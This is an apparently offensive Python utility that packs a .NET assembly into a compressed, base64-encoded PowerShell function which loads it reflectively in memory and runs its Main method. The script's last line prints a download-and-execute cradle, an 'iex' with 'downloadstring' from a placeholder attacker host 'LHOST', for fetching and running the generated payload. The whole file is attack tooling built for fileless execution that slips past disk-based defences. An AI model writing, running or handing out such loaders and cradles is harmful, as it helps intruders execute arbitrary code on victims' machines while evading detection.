#!/usr/bin/env python3

import sys
import zlib
import base64
from pathlib import Path
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument('dotnetassembly', action='store', type=str, help='path to the .NET assembly to wrapped in PowerShell')
parser.add_argument('--no-args', action='store_true', default=False, help='pass $args to Main')
args = parser.parse_args()

if args.no_args:
    args = ''
else:
    args = '[string[]]$args'
    #args = '$Command'

dotnetassembly_path = sys.argv[1]
dotnetassembly_path = Path(dotnetassembly_path.split()[0])

with open(dotnetassembly_path, 'rb') as f:
    deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
    dotnetassembly_compressed = deflate_stream.compress(f.read())
    dotnetassembly_compressed += deflate_stream.flush()
dotnetassembly_compressed_b64 = base64.b64encode(dotnetassembly_compressed).decode()
dotnetassembly_func_name = f'Invoke-{dotnetassembly_path.stem}'

pwsh = f'''\
function {dotnetassembly_func_name}
{{
    $a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("{dotnetassembly_compressed_b64}"))
    $b = New-Object System.IO.Compression.DeflateStream($a, [System.IO.Compression.CompressionMode]::Decompress)
    $c = New-Object System.IO.MemoryStream;
    $b.CopyTo($c)
    [byte[]]$d = $c.ToArray()
    $e = [System.Reflection.Assembly]::Load($d)
    $f = [System.Console]::Out
    $g = New-Object System.IO.StringWriter
    [System.Console]::SetOut($g)

    $h = [Reflection.BindingFlags]"Public,NonPublic,Static"
    $i = $e.GetType("{dotnetassembly_path.stem}.Program", $h)
    $j = $i.GetMethod("Main", $h)
    $j.Invoke($null, (, {args}))

    [System.Console]::SetOut($f)
    $k = $g.ToString()
    $k
}}
'''

with open(Path.cwd() / f'{dotnetassembly_func_name}.ps1', 'w') as f:
    f.write(pwsh)

print(f'[+] Contents written to {dotnetassembly_func_name}.ps1')
print(f'[*] iex(new-object net.webclient).downloadstring("http://LHOST/{dotnetassembly_func_name}.ps1");{dotnetassembly_func_name}')
